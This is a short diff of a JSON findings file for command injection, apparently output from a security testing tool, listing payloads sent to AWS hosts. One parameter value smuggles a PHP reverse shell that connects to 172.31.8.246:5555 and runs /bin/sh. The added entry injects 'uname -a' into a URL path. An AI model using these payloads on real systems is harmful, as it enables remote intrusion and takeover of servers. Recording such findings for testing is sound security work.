@@ -1,5 +1,5 @@
 {
-  "class": "Command Injection", 
+  "class": "Command Injection",
   "results": {
     "http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8081": [
       {
@@ -9,6 +9,13 @@
           "count": "3 & php -r '$s=fsockopen(\"172.31.8.246\",5555);exec('/bin/sh -i <&3 >&3 2>&3');' & echo"
         },
         "method": "POST"
+      }
+    ],
+    "http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8082" : [
+      {
+        "endpoint": "/picturise/uname%20-a",
+        "params": {},
+        "method": "GET"
       }
     ]
   }
